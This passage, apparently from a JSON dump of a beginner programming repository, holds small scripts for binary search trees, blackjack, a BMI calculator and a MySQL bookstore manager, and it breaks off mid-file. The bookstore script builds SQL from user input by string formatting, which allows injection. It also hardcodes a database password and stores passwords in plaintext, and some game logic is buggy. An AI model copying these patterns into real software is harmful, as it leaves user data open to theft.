          "content": "//Java implementation to check if given Binary tree \n//is a BST or not \n\n/* Class containing left and right child of current \nnode and key value*/\nclass Node \n{ \n\tint data; \n\tNode left, right; \n\n\tpublic Node(int item) \n\t{ \n\t\tdata = item; \n\t\tleft = right = null; \n\t} \n} \n\npublic class BinaryTree \n{ \n\t//Root of the Binary Tree \n\tNode root; \n\n\t/* can give min and max value according to your code or \n\tcan write a function to find min and max value of tree. */\n\n\t/* returns true if given search tree is binary \n\tsearch tree (efficient version) */\n\tboolean isBST() { \n\t\treturn isBSTUtil(root, Integer.MIN_VALUE, \n\t\t\t\t\t\t\tInteger.MAX_VALUE); \n\t} \n\n\t/* Returns true if the given tree is a BST and its \n\tvalues are >= min and <= max. */\n\tboolean isBSTUtil(Node node, int min, int max) \n\t{ \n\t\t/* an empty tree is BST */\n\t\tif (node == null) \n\t\t\treturn true; \n\n\t\t/* false if this node violates the min/max constraints */\n\t\tif (node.data < min || node.data > max) \n\t\t\treturn false; \n\n\t\t/* otherwise check the subtrees recursively \n\t\ttightening the min/max constraints */\n\t\t// Allow only distinct values \n\t\treturn (isBSTUtil(node.left, min, node.data-1) && \n\t\t\t\tisBSTUtil(node.right, node.data+1, max)); \n\t} \n\n\t/* Driver program to test above functions */\n\tpublic static void main(String args[]) \n\t{ \n\t\tBinaryTree tree = new BinaryTree(); \n\t\ttree.root = new Node(4); \n\t\ttree.root.left = new Node(2); \n\t\ttree.root.right = new Node(5); \n\t\ttree.root.left.left = new Node(1); \n\t\ttree.root.left.right = new Node(3); \n\n\t\tif (tree.isBST()) \n\t\t\tSystem.out.println(\"IS BST\"); \n\t\telse\n\t\t\tSystem.out.println(\"Not a BST\"); \n\t} \n} \n"
        },
        {
          "name": "binary_search_tree.py",
          "type": "blob",
          "size": 11.001953125,
          "content": "class Node:\n    \"\"\"Class for node of a tree\"\"\"\n\n    def __init__(self, info):\n        \"\"\"Initialising a node\"\"\"\n        self.info = info\n        self.left = None\n        self.right = None\n        # self.level = None\n\n    def __str__(self):\n        return str(self.info)\n\n    def __del__(self):\n        del self\n\n\nclass BinarySearchTree:\n    \"\"\"Class for BST\"\"\"\n\n    def __init__(self):\n        \"\"\"Initialising a BST\"\"\"\n        self.root = None\n\n    def insert(self, val):\n        \"\"\"Creating a BST with root value as val\"\"\"\n        # Check if tree has root with None value\n        if self.root is None:\n            self.root = Node(val)\n        # Here the tree already has one root\n        else:\n            current = self.root\n            while True:\n                if val < current.info:\n                    if current.left:\n                        current = current.left\n                    else:\n                        current.left = Node(val)\n                        break\n                elif val > current.info:\n                    if current.right:\n                        current = current.right\n                    else:\n                        current.right = Node(val)\n                        break\n                else:\n                    break\n\n    def search(self, val, to_delete=False):\n        current = self.root\n        prev = -1\n        while current:\n            if val < current.info:\n                prev = current\n                current = current.left\n            elif val > current.info:\n                prev = current\n                current = current.right\n            elif current.info == val:\n                if not to_delete:\n                    return \"Match Found\"\n                return prev\n            else:\n                break\n        if not to_delete:\n            return \"Not Found\"\n\n    # Method to delete a tree-node if it exists, else error message will be returned.\n    def delete(self, val):\n        prev = self.search(val, True)\n        # Check if node exists\n        if prev is not None:\n            # Check if node is the Root node\n            if prev == -1:\n                temp = self.root.left\n                prev2 = None\n                while temp.right:\n                    prev2 = temp\n                    temp = temp.right\n                if prev2 is None:\n                    self.root.left = temp.left\n                    self.root.info = temp.info\n                else:\n                    prev2.right = None\n                    self.root.info = temp.info\n                print(\"Deleted Root \", val)\n            # Check if node is to left of its parent\n            elif prev.left and prev.left.info == val:\n                # Check if node is leaf node\n                if prev.left.left is prev.left.right:\n                    prev.left = None\n                    print(\"Deleted Node \", val)\n                # Check if node has child at left and None at right\n                elif prev.left.left and prev.left.right is None:\n                    prev.left = prev.left.left\n                    print(\"Deleted Node \", val)\n                # Check if node has child at right and None at left\n                elif prev.left.left is None and prev.left.right:\n                    prev.left = prev.left.right\n                    print(\"Deleted Node \", val)\n                # Here node to be deleted has 2 children\n                elif prev.left.left and prev.left.right:\n                    temp = prev.left\n                    while temp.right is not None:\n                        prev2 = temp\n                        temp = temp.right\n                    prev2.right = None\n                    prev.left.info = temp.info\n                    print(\"Deleted Node \", val)\n                else:\n                    print(\"Error Left\")\n\n            # Check if node is to right of its parent\n            elif prev.right.info == val:\n                flag = 0\n                # Check is node is a leaf node\n                if prev.right.left is prev.right.right:\n                    prev.right = None\n                    flag = 1\n                    print(\"Deleted Node \", val)\n                # Check if node has left child at None at right\n                if prev.right and prev.right.left and prev.right.right is None:\n                    prev.right = prev.right.left\n                    print(\"Deleted Node \", val)\n                # Check if node has right child at None at left\n                elif prev.right and prev.right.left is None and prev.right.right:\n                    prev.right = prev.right.right\n                    print(\"Deleted Node \", val)\n                elif prev.right and prev.right.left and prev.right.right:\n                    temp = prev.right\n                    while temp.left is not None:\n                        prev2 = temp\n                        temp = temp.left\n                    prev2.left = None\n                    prev.right.info = temp.info\n                    print(\"Deleted Node \", val)\n                else:\n                    if flag == 0:\n                        print(\"Error\")\n        else:\n            print(\"Node doesn't exists\")\n\n    def __str__(self):\n        return \"Not able to print tree yet\"\n\n\ndef is_bst(node, lower_lim=None, upper_lim=None):\n    \"\"\"Function to find is a binary tree is a binary search tree.\"\"\"\n    if lower_lim is not None and node.info < lower_lim:\n        return False\n    if upper_lim is not None and node.info > upper_lim:\n        return False\n    is_left_bst = True\n    is_right_bst = True\n    if node.left is not None:\n        is_left_bst = is_bst(node.left, lower_lim, node.info)\n    if is_left_bst and node.right is not None:\n        is_right_bst = is_bst(node.right, node.info, upper_lim)\n    return is_left_bst and is_right_bst\n\n\ndef postorder(node):\n    # L R N : Left , Right, Node\n    if node is None:\n        return\n    if node.left:\n        postorder(node.left)\n    if node.right:\n        postorder(node.right)\n    print(node.info)\n\n\ndef inorder(node):\n    # L N R : Left, Node , Right\n    if node is None:\n        return\n    if node.left:\n        inorder(node.left)\n    print(node.info)\n    if node.right:\n        inorder(node.right)\n\n\ndef preorder(node):\n    # N L R : Node , Left, Right\n    if node is None:\n        return\n    print(node.info)\n    if node.left:\n        preorder(node.left)\n    if node.right:\n        preorder(node.right)\n\n\n# Levelwise\ndef bfs(node):\n    queue = []\n    if node:\n        queue.append(node)\n    while queue != []:\n        temp = queue.pop(0)\n        print(temp.info)\n        if temp.left:\n            queue.append(temp.left)\n        if temp.right:\n            queue.append(temp.right)\n\n\ndef preorder_itr(node):\n    # N L R : Node, Left , Right\n    stack = [node]\n    values = []\n    while stack != []:\n        temp = stack.pop()\n        print(temp.info)\n        values.append(temp.info)\n        if temp.right:\n            stack.append(temp.right)\n        if temp.left:\n            stack.append(temp.left)\n    return values\n\n\ndef inorder_itr(node):\n    # L N R : Left, Node, Right\n    # 1) Create an empty stack S.\n    # 2) Initialize current node as root\n    # 3) Push the current node to S and set current = current->left until current is NULL\n    # 4) If current is NULL and stack is not empty then\n    #     a) Pop the top item from stack.\n    #     b) Print the popped item, set current = popped_item->right\n    #     c) Go to step 3.\n    # 5) If current is NULL and stack is empty then we are done.\n    stack = []\n    current = node\n    while True:\n        if current != None:\n            stack.append(current)  # L\n            current = current.left\n        elif stack != []:\n            temp = stack.pop()\n            print(temp.info)  # N\n            current = temp.right  # R\n        else:\n            break\n\n\ndef postorder_itr(node):\n    # L R N\n    # 1. Push root to first stack.\n    # 2. Loop while first stack is not empty\n    # 2.1 Pop a node from first stack and push it to second stack\n    # 2.2 Push left and right children of the popped node to first stack\n    # 3. Print contents of second stack\n    s1, s2 = [node], []\n    while s1 != []:\n        temp = s1.pop()\n        s2.append(temp)\n        if temp.left:\n            s1.append(temp.left)\n        if temp.right:\n            s1.append(temp.right)\n    print(*(s2[::-1]))\n\n\ndef bst_frm_pre(pre_list):\n    box = Node(pre_list[0])\n    if len(pre_list) > 1:\n        if len(pre_list) == 2:\n            if pre_list[1] > pre_list[0]:\n                box.right = Node(pre_list[1])\n            else:\n                box.left = Node(pre_list[1])\n        else:\n            all_less = False\n            for i in range(1, len(pre_list)):\n                if pre_list[i] > pre_list[0]:\n                    break\n            else:\n                all_less = True\n            if i != 1:\n                box.left = bst_frm_pre(pre_list[1:i])\n            if not all_less:\n                box.right = bst_frm_pre(pre_list[i:])\n    return box\n\n\n# Function to find the lowest common ancestor of nodes with values c1 and c2.\n# It return value in the lowest common ancestor, -1 indicates value returned for None.\n# Note that both values v1 and v2 should be present in the bst.\ndef lca(t_node, c1, c2):\n    if c1 == c2:\n        return c1\n    current = t_node\n    while current:\n        if c1 < current.info and c2 < current.info:\n            current = current.left\n        elif c1 > current.info and c2 > current.info:\n            current = current.right\n        else:\n            return current.info\n    return -1\n\n\n# Function to print element vertically which lie just below the root node\ndef vertical_middle_level(t_node):\n    e = (t_node, 0)  # 0 indicates level 0, to left we have -ve and to right +ve\n    queue = [e]\n    ans = []\n    # Do a level-order traversal and assign level-value to each node\n    while queue != []:\n        temp, level = queue.pop(0)\n        if level == 0:\n            ans.append(str(temp.info))\n        if temp.left:\n            queue.append((temp.left, level - 1))\n        if temp.right:\n            queue.append((temp.right, level + 1))\n    return \" \".join(ans)\n\n\ndef get_level(n, val):\n    c_level = 0\n\n    while n.info != val:\n        if val < n.info:\n            n = n.left\n        elif val > n.info:\n            n = n.right\n        c_level += 1\n        if n is None:\n            return -1\n\n    return c_level\n\n\ndef depth(node):\n    if node is None:\n        return 0\n    l_depth, r_depth = 0, 0\n    if node.left:\n        l_depth = depth(node.left)\n    if node.right:\n        r_depth = depth(node.right)\n    # print(node.info, l_depth, r_depth)\n    return 1 + max(l_depth, r_depth)\n\n\nt = BinarySearchTree()\nt.insert(10)\nt.insert(5)\nt.insert(15)\nt.insert(3)\nt.insert(1)\nt.insert(0)\nt.insert(2)\nt.insert(7)\nt.insert(12)\nt.insert(18)\nt.insert(19)\nprint(depth(t.root))\n# inorder(t.root)\n# print()\n# print(t.search(5))\n# t.delete(7)\n# t.delete(5)\n# t.delete(3)\n# t.delete(15)\n# inorder(t.root)\n# print()\n# t.delete(2)\n# t.delete(3)\n# t.delete(7)\n# t.delete(19)\n# t.delete(1)\n# inorder(t.root)\n# b = BinarySearchTree()\n# b.root = bst_frm_pre(preorder_itr(t.root))\n# print(preorder_itr(b.root) == preorder_itr(t.root))\n# print(lca(t.root, 3, 18))\n# print(vertical_middle_level(t.root))\n# print(get_level(t.root, 1))\n"
        },
        {
          "name": "binary_search_trees",
          "type": "tree",
          "content": null
        },
        {
          "name": "binod.py",
          "type": "blob",
          "size": 1.2041015625,
          "content": "# patch-1\n# import os\n# The OS module in python provides functions for interacting with the operating system\n\n# patch-3\n# function to check if 'binod' is present in the file.\n# def checkBinod(file):\n# =======\n\n# def checkBinod(file):       #this function will check there is any 'Binod' text in file or not\n#     with open(file, \"r\") as f: #we are opening file in read mode and using 'with' so need to take care of close()\n# =======\nimport time\nimport os\n\n# Importing our Bindoer\nprint(\"To Kaise Hai Ap Log!\")\ntime.sleep(1)\nprint(\"Chaliye Binod Karte Hai!\")\n\n\ndef checkBinod(file):  # Trying to find Binod In File Insted Of Manohar Ka Kotha\n    # master\n    with open(file, \"r\") as f:\n        # master\n        fileContent = f.read()\n    if \"binod\" in fileContent.lower():\n        print(f\"**************Congratulations Binod found in {f}********************\")\n        return True\n    else:\n        return False\n\n\nif __name__ == \"__main__\":\n    print(\"************binod Detector********************\")\n    dir_contents = os.listdir()\n    for item in dir_contents:\n        if item.endswith(\"txt\"):\n            ans = checkBinod(item)\n            if ans is False:\n                print(\"Binod not found Try Looking In Manohar Ka Kotha!!\")\n"
        },
        {
          "name": "binod.txt",
          "type": "blob",
          "size": 0.0107421875,
          "content": "I am binod\n"
        },
        {
          "name": "birthdays.py",
          "type": "blob",
          "size": 0.4375,
          "content": "birthdays = {'Alice': 'Apr 1', 'Bob': 'Dec 12', 'Carol': 'Mar 4'}\nwhile True:\n   \n   print('Enter a name: (blank to quit)')\n   name = input()\n   if name == '':\n      break\n   if name in birthdays:\n      print(birthdays[name] + ' is the birthday of ' + name)\n   else:\n      print('I do not have birthday information for ' + name)\n   print('What is their birthday?')\n   bday = input()\n   birthdays[name] = bday\n   print('Birthday database updated.')\n"
        },
        {
          "name": "blackJackGUI.py",
          "type": "blob",
          "size": 4.46875,
          "content": "from __future__ import print_function\r\nimport random\r\nimport simplegui\r\n\r\nCARD_SIZE = (72, 96)\r\nCARD_CENTER = (36, 48)\r\ncard_images = simplegui.load_image(\r\n    \"http://storage.googleapis.com/codeskulptor-assets/cards_jfitz.png\"\r\n)\r\n\r\nin_play = False\r\noutcome = \"\"\r\nscore = 0\r\n\r\nSUITS = (\"C\", \"S\", \"H\", \"D\")\r\nRANKS = (\"A\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"T\", \"J\", \"Q\", \"K\")\r\nVALUES = {\r\n    \"A\": 1,\r\n    \"2\": 2,\r\n    \"3\": 3,\r\n    \"4\": 4,\r\n    \"5\": 5,\r\n    \"6\": 6,\r\n    \"7\": 7,\r\n    \"8\": 8,\r\n    \"9\": 9,\r\n    \"T\": 10,\r\n    \"J\": 10,\r\n    \"Q\": 10,\r\n    \"K\": 10,\r\n}\r\n\r\n\r\nclass Card:\r\n    def __init__(self, suit, rank):\r\n        if (suit in SUITS) and (rank in RANKS):\r\n            self.suit = suit\r\n            self.rank = rank\r\n        else:\r\n            self.suit = None\r\n            self.rank = None\r\n            print((\"Invalid card: \", suit, rank))\r\n\r\n    def __str__(self):\r\n        return self.suit + self.rank\r\n\r\n    def get_suit(self):\r\n        return self.suit\r\n\r\n    def get_rank(self):\r\n        return self.rank\r\n\r\n    def draw(self, canvas, pos):\r\n        card_loc = (\r\n            CARD_CENTER[0] + CARD_SIZE[0] * RANKS.index(self.rank),\r\n            CARD_CENTER[1] + CARD_SIZE[1] * SUITS.index(self.suit),\r\n        )\r\n        canvas.draw_image(\r\n            card_images,\r\n            card_loc,\r\n            CARD_SIZE,\r\n            [pos[0] + CARD_CENTER[0], pos[1] + CARD_CENTER[1]],\r\n            CARD_SIZE,\r\n        )\r\n\r\n\r\ndef string_list_join(string, string_list):\r\n    ans = string + \" contains \"\r\n    for i in range(len(string_list)):\r\n        ans += str(string_list[i]) + \" \"\r\n    return ans\r\n\r\n\r\nclass Hand:\r\n    def __init__(self):\r\n        self.hand = []\r\n\r\n    def __str__(self):\r\n        return string_list_join(\"Hand\", self.hand)\r\n\r\n    def add_card(self, card):\r\n        self.hand.append(card)\r\n\r\n    def get_value(self):\r\n        var = []\r\n        self.hand_value = 0\r\n        for card in self.hand:\r\n            card = str(card)\r\n            if card[1] in VALUES:\r\n                self.hand_value += VALUES[card[1]]\r\n                var.append(card[1])\r\n        if \"A\" not in var:\r\n            return self.hand_value\r\n        if self.hand_value + 10 <= 21:\r\n            return self.hand_value + 10\r\n        else:\r\n            return self.hand_value\r\n\r\n    def draw(self, canvas, pos):\r\n        for card in self.hand:\r\n            card = str(card)\r\n            Card(card[0], card[1]).draw(canvas, pos)\r\n            pos[0] += 36\r\n\r\n\r\nclass Deck:\r\n    def __init__(self):\r\n        self.Deck = [Card(suit, rank) for suit in SUITS for rank in RANKS]\r\n\r\n    def shuffle(self):\r\n        random.shuffle(self.Deck)\r\n\r\n    def deal_card(self):\r\n        return random.choice(self.Deck)\r\n\r\n    def __str__(self):\r\n        return string_list_join(\"Deck\", self.Deck)\r\n\r\n\r\ndef deal():\r\n    global outcome, in_play, score1, score2, player_card, dealer_card, deck\r\n    outcome = \"\"\r\n    player_card = Hand()\r\n    dealer_card = Hand()\r\n    deck = Deck()\r\n    for i in range(2):\r\n        player_card.add_card(deck.deal_card())\r\n        dealer_card.add_card(deck.deal_card())\r\n\r\n    in_play = True\r\n    score1 = str(player_card.get_value())\r\n    score2 = str(dealer_card.get_value())\r\n\r\n\r\ndef stand():\r\n    if in_play == True:\r\n        while dealer_card.get_value() < 17:\r\n            dealer_card.add_card(deck.deal_card())\r\n    if dealer_card.get_value() > 21:\r\n        outcome = \"you won!!\"\r\n    elif player_card.get_value() <= dealer_card.get_value():\r\n        outcome = \"you lose\"\r\n    else:\r\n        outcome = \"you won!!\"\r\n    score1 = str(player_card.get_value())\r\n    score2 = str(dealer_card.get_value())\r\n\r\n\r\ndef hit():\r\n    global outcome, in_play, score1, score2, player_card, dealer_card, deck\r\n    if in_play == True:\r\n        player_card.add_card(deck.deal_card())\r\n\r\n    if player_card.get_value() > 21:\r\n        outcome = \"you are busted\"\r\n        in_play = False\r\n\r\n    score1 = str(player_card.get_value())\r\n    score2 = str(dealer_card.get_value())\r\n\r\n\r\ndef draw(canvas):\r\n    canvas.draw_text(outcome, [250, 150], 25, \"White\")\r\n    canvas.draw_text(\"BlackJack\", [250, 50], 40, \"Black\")\r\n    canvas.draw_text(score1, [100, 100], 40, \"Red\")\r\n\r\n    player_card.draw(canvas, [20, 300])\r\n    dealer_card.draw(canvas, [300, 300])\r\n    canvas.draw_text(score2, [400, 100], 40, \"Red\")\r\n\r\n\r\nframe = simplegui.create_frame(\"Blackjack\", 600, 600)\r\nframe.set_canvas_background(\"Green\")\r\n\r\nframe.add_button(\"Deal\", deal, 200)\r\nframe.add_button(\"Hit\", hit, 200)\r\nframe.add_button(\"Stand\", stand, 200)\r\nframe.set_draw_handler(draw)\r\n\r\ndeal()\r\nframe.start()\r\n"
        },
        {
          "name": "blackjack.py",
          "type": "blob",
          "size": 3.5185546875,
          "content": "# BLACK JACK - CASINO\n\nimport random\n\ndeck = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 10, 10, 10, 11] * 4\n\nrandom.shuffle(deck)\n\nprint(\n    \"                       **********************************************************                                    \"\n)\nprint(\n    \"                                   Welcome to the game Casino - BLACK JACK !                                         \"\n)\nprint(\n    \"                       **********************************************************                                    \"\n)\n\nd_cards = []  # Initialising dealer's cards\np_cards = []  # Initialising player's cards\n\nwhile len(d_cards) != 2:\n    random.shuffle(deck)\n    d_cards.append(deck.pop())\n    if len(d_cards) == 2:\n        print(\"The cards dealer has are X \", d_cards[1])\n\n# Displaying the Player's cards\nwhile len(p_cards) != 2:\n    random.shuffle(deck)\n    p_cards.append(deck.pop())\n    if len(p_cards) == 2:\n        print(\"The total of player is \", sum(p_cards))\n        print(\"The cards Player has are  \", p_cards)\n\nif sum(p_cards) > 21:\n    print(\"You are BUSTED !\\n  **************Dealer Wins !!******************\\n\")\n    exit()\n\nif sum(d_cards) > 21:\n    print(\n        \"Dealer is BUSTED !\\n   ************** You are the Winner !!******************\\n\"\n    )\n    exit()\n\nif sum(d_cards) == 21:\n    print(\"***********************Dealer is the Winner !!******************\")\n    exit()\n\nif sum(d_cards) == 21 and sum(p_cards) == 21:\n    print(\"*****************The match is tie !!*************************\")\n    exit()\n\n\ndef dealer_choice():\n    if sum(d_cards) < 17:\n        while sum(d_cards) < 17:\n            random.shuffle(deck)\n            d_cards.append(deck.pop())\n\n    print(\"Dealer has total \" + str(sum(d_cards)) + \"with the cards \", d_cards)\n\n    if sum(p_cards) == sum(d_cards):\n        print(\"***************The match is tie !!****************\")\n        exit()\n\n    if sum(d_cards) == 21:\n        if sum(p_cards) < 21:\n            print(\"***********************Dealer is the Winner !!******************\")\n        elif sum(p_cards) == 21:\n            print(\"********************There is tie !!**************************\")\n        else:\n            print(\"***********************Dealer is the Winner !!******************\")\n\n    elif sum(d_cards) < 21:\n        if sum(p_cards) < 21 and sum(p_cards) < sum(d_cards):\n            print(\"***********************Dealer is the Winner !!******************\")\n        if sum(p_cards) == 21:\n            print(\"**********************Player is winner !!**********************\")\n        if sum(p_cards) < 21 and sum(p_cards) > sum(d_cards):\n            print(\"**********************Player is winner !!**********************\")\n\n    else:\n        if sum(p_cards) < 21:\n            print(\"**********************Player is winner !!**********************\")\n        elif sum(p_cards) == 21:\n            print(\"**********************Player is winner !!**********************\")\n        else:\n            print(\"***********************Dealer is the Winner !!******************\")\n\n\nwhile sum(p_cards) < 21:\n\n    k = input(\"Want to hit or stay?\\n Press 1 for hit and 0 for stay \")\n    if k == 1:\n        random.shuffle(deck)\n        p_cards.append(deck.pop())\n        print(\"You have a total of \" + str(sum(p_cards)) + \" with the cards \", p_cards)\n        if sum(p_cards) > 21:\n            print(\"*************You are BUSTED !*************\\n Dealer Wins !!\")\n        if sum(p_cards) == 21:\n            print(\n                \"*******************You are the Winner !!*****************************\"\n            )\n\n    else:\n        dealer_choice()\n        break\n"
        },
        {
          "name": "bodymass.py",
          "type": "blob",
          "size": 0.6328125,
          "content": "kilo = float (input(\"kilonuzu giriniz(örnek: 84.9): \"))\nboy = float (input(\"Boyunuzu m cinsinden giriniz: \"))\n\nvki = (kilo / (boy**2))\n\nif vki < 18.5:\n    print(f\"vucut kitle indeksiniz:  {vki} zayıfsınız.\")\nelif vki < 25:\n    print (f\"vucut kitle indeksiniz: {vki} normalsiniz.\")\nelif vki < 30:\n    print (f\"vucut kitle indeksiniz: {vki} fazla kilolusunuz.\")\nelif vki < 35:\n    print (f\"vucut kitle indeksiniz: {vki} 1. derece obezsiniz\")\nelif vki < 40:\n    print (f\"vucut kitle indeksiniz: {vki} 2.derece obezsiniz.\")\nelif vki >40:\n    print (f\"vucut kitle indeksiniz: {vki} 3.derece obezsiniz.\")\nelse:\n    print(\"Yanlış değer girdiniz.\")\n"
        },
        {
          "name": "bookstore_manangement_system.py",
          "type": "blob",
          "size": 21.900390625,
          "content": "import os\n\n\nimport mysql.connector as mys\n\nmycon = mys.connect(\n    host=\"localhost\", user=\"root\", passwd=\"Yksrocks\", database=\"book_store_management\"\n)\n\n\nif mycon.is_connected():\n    print()\n    print(\"successfully connected\")\n\nmycur = mycon.cursor()\n\n\ndef DBZ():\n\n    # IF  NO.  OF  BOOKS  IS     ZERO(0)     THAN  DELETE  IT  AUTOMATICALLY\n\n    display = \"select * from books\"\n    mycur.execute(display)\n    data2 = mycur.fetchall()\n\n    for y in data2:\n\n        if y[6] <= 0:\n\n            delete = \"delete from books where  Numbers_of_book<=0\"\n            mycur.execute(delete)\n            mycon.commit()\n\n\ndef separator():\n    print()\n    print(\"\\t\\t========================================\")\n    print()\n\n\ndef end_separator():\n    print()\n    print()\n\n\ndef login():\n\n    user_name = input(\" USER NAME  ---  \")\n    passw = input(\" PASSWORD  ---  \")\n\n    display = \"select * from login\"\n    mycur.execute(display)\n    data2 = mycur.fetchall()\n\n    for y in data2:\n\n        if y[1] == user_name and y[2] == passw:\n\n            pass\n\n        else:\n\n            separator()\n\n            print(\" Username  or  Password  is  Incorrect  Try Again\")\n\n            separator()\n\n            user_name = input(\" USER NAME  ---  \")\n            passw = input(\" PASSWORD  ---  \")\n\n            if y[1] == user_name and y[2] == passw:\n\n                pass\n\n            else:\n\n                separator()\n\n                print(\" Username  or  Password  is  Again  Incorrect\")\n                exit()\n\n\ndef ViewAll():\n\n    print(\"\\u0332\".join(\"BOOK NAMES~~\"))\n    print(\"------------------------------------\")\n\n    display = \"select * from books\"\n    mycur.execute(display)\n    data2 = mycur.fetchall()\n    c = 0\n\n    for y in data2:\n\n        c = c + 1\n        print(c, \"-->\", y[1])\n\n\ndef CNB1():\n\n    if y[6] == 0:\n\n        separator()\n\n        print(\" NOW  THIS  BOOK  IS  NOT  AVAILABLE \")\n\n    elif y[6] > 0 and y[6] <= 8:\n\n        separator()\n\n        print(\"WARNING!!!!!!!!!!!!!!!!!!!!!!!\")\n        print(\"NO.  OF THIS BOOK IS LOW\", \"\\tONLY\", y[6] - 1, \"LEFT\")\n\n        print()\n        print()\n\n    elif y[6] > 8:\n\n        separator()\n\n        print(\"NO.  OF  BOOKS  LEFT  IS \", y[6] - 1)\n\n        print()\n        print()\n\n\ndef CNB2():\n\n    if y[6] <= 8:\n\n        separator()\n\n        print(\"WARNING!!!!!!!!!!!!!!!!!!!!!!!\")\n        print(\"NO.  OF THIS BOOK IS LOW\", \"\\tONLY\", y[6], \"LEFT\")\n\n    else:\n\n        separator()\n\n        print(\"NO.  OF  BOOKS  LEFT  IS \", y[6])\n\n\nseparator()\n\n\n# LOGIN\n\n\ndisplay12 = \"select * from visit\"\nmycur.execute(display12)\ndata2222 = mycur.fetchall()\nfor m in data2222:\n\n    if m[0] == 0:\n\n        c = m[0]\n        display11 = \"select * from login\"\n        mycur.execute(display11)\n        data222 = mycur.fetchall()\n\n        if c == 0:\n\n            if c == 0:\n\n                print(\"\\t\\t\\t\\t REGESTER     \")\n                print(\"\\t\\t\\t\\t----------------------------\")\n\n                print()\n                print()\n\n                user_name = input(\"ENTER  USER  NAME -- \")\n                passw = input(\"ENTER  PASSWORD  limit 8-20  -- \")\n                lenght = len(passw)\n\n                if lenght >= 8 and lenght <= 20:\n\n                    c = c + 1\n                    insert55 = (c, user_name, passw)\n                    insert22 = \"insert into login values(%s,%s,%s)\"\n                    mycur.execute(insert22, insert55)\n                    mycon.commit()\n\n                    separator()\n\n                    login()\n\n                else:\n\n                    if lenght < 8:\n\n                        separator()\n\n                        print(\" Password Is less than  8  Characters  Enter Again\")\n\n                        separator()\n\n                        user_name2 = input(\"ENTER  USER  NAME -- \")\n                        passw2 = input(\"ENTER  PASSWORD AGAIN (limit 8-20) -- \")\n                        lenght1 = len(passw2)\n\n                        if lenght1 >= 8 and lenght1 <= 20:\n\n                            c = c + 1\n                            insert555 = (c, user_name2, passw2)\n                            insert222 = \"insert into login values(%s,%s,%s)\"\n                            mycur.execute(insert222, insert555)\n                            mycon.commit()\n\n                            separator()\n\n                            login()\n\n                        elif lenght > 20:\n\n                            separator()\n\n                            print(\n                                \" Password Is  Greater  than  20  Characters  Enter Again\"\n                            )\n\n                            separator()\n\n                            user_name = input(\"ENTER  USER  NAME -- \")\n                            passw = input(\"ENTER  PASSWORD AGAIN (limit 8-20) -- \")\n                            lenght = len(passw)\n\n                            if lenght >= 8 and lenght >= 20:\n\n                                c = c + 1\n                                insert55 = (c, user_name, passw)\n                                insert22 = \"insert into login values(%s,%s,%s)\"\n                                mycur.execute(insert22, insert55)\n                                mycon.commit()\n\n                                separator()\n\n                                login()\n\n        update33 = \"update visit set visits=%s\" % (c)\n        mycur.execute(update33)\n        mycon.commit()\n\n    elif m[0] == 1:\n\n        if m[0] == 1:\n\n            login()\n\n\nseparator()\n\n\nDBZ()\n\n\n# REPETITION\n\n\na = True\n\n\nwhile a == True:\n\n    # PROGRAM STARTED\n\n    print(\"     *TO VIEW ALL ENTER 1\")\n    print(\"     *TO SEARCH and BUY BOOK ENTER 2\")\n    print(\"     *TO ADD BOOK ENTER 3\")\n    print(\"     *TO UPDATE ENTER 4\")\n    print(\"     *TO DELETE BOOK ENTER 5\")\n    print(\"     *TO CLOSE ENTER 6\")\n\n    print()\n\n    choice = int(input(\"ENTER YOUR CHOICE -- \"))\n\n    separator()\n\n    # VIEW\n\n    if choice == 1:\n\n        print()\n\n        ViewAll()\n\n        separator()\n\n        rep = input(\"Do  You  Want  To  Restart  ??    yes / no  --  \").lower()\n\n        if rep == \"yes\":\n\n            end_separator()\n\n            separator()\n\n            DBZ()\n\n            continue\n\n        else:\n\n            end_separator()\n\n            DBZ()\n\n            os._exit(0)\n\n        end_separator()\n\n    # SEARCH / BUY\n\n    if choice == 2:\n\n        book_name = input(\"ENTER BOOK NAME ---- \")\n\n        separator()\n\n        display = \"select * from books where Name='%s'\" % (book_name)\n        mycur.execute(display)\n        data2 = mycur.fetchone()\n\n        if data2 != None:\n\n            print(\"BOOK IS AVAILABLE\")\n\n            # BUY OR NOT\n\n            separator()\n\n            print(\"\\t*WANT TO BUY PRESS 1\")\n            print(\"\\t*IF NOT PRESS 2\")\n            print()\n\n            choice2 = int(input(\"ENTER YOUR CHOICE -- \"))\n\n            if choice2 == 1:\n\n                # BUY 1 OR MORE\n\n                separator()\n\n                print(\"\\t*IF YOU WANT ONE BOOK PRESS 1\")\n                print(\"\\t*IF YOU WANT MORE THAN ONE BOOK PRESS 2\")\n                print()\n\n                choice3 = int(input(\"ENTER YOUR CHOICE -- \"))\n\n                if choice3 == 1:\n\n                    display = \"select * from books\"\n                    mycur.execute(display)\n                    data2 = mycur.fetchall()\n\n                    for y in data2:\n\n                        if y[1] == book_name:\n\n                            if y[6] > 0:\n\n                                separator()\n\n                                u = (\n                                    \"update books set Numbers_of_book=Numbers_of_book - 1 where name='%s';\"\n                                    % (book_name)\n                                )\n                                mycur.execute(u)\n                                mycon.commit()\n\n                                print(\"BOOK WAS BOUGHT\")\n\n                                separator()\n\n                                print(\"THANKS FOR COMING\")\n\n                                CNB1()\n\n                                separator()\n\n                                rep = input(\n                                    \"Do  You  Want  To  Restart  ??    yes / no  --  \"\n                                ).lower()\n\n                                if rep == \"yes\":\n\n                                    end_separator()\n\n                                    separator()\n\n                                    DBZ()\n\n                                    continue\n\n                                else:\n\n                                    end_separator()\n\n                                    DBZ()\n\n                                    os._exit(0)\n\n                if choice3 == 2:\n\n                    separator()\n\n                    wb = int(input(\"ENTER NO. OF BOOKS -- \"))\n\n                    separator()\n\n                    display = \"select * from books\"\n                    mycur.execute(display)\n                    data2 = mycur.fetchall()\n\n                    for y in data2:\n\n                        if y[1] == book_name:\n\n                            if wb > y[6]:\n\n                                if y[6] > 0:\n\n                                    print(\"YOU CAN'T  BUT  THAT  MUCH  BOOKS\")\n\n                                    separator()\n\n                                    print(\"BUT YOU CAN BUY\", y[6], \"BOOKS MAX\")\n\n                                    separator()\n\n                                    choice44 = input(\n                                        \"DO YOU WANT TO BUY BOOK ?     Y/N -- \"\n                                    )\n\n                                    separator()\n\n                                    k = y[6]\n\n                                    if choice44 == \"y\" or choice44 == \"Y\":\n\n                                        u2 = (\n                                            \"update books set numbers_of_book=numbers_of_book -%s where name='%s'\"\n                                            % (k, book_name)\n                                        )\n                                        mycur.execute(u2)\n                                        mycon.commit()\n\n                                        print(\"BOOK WAS 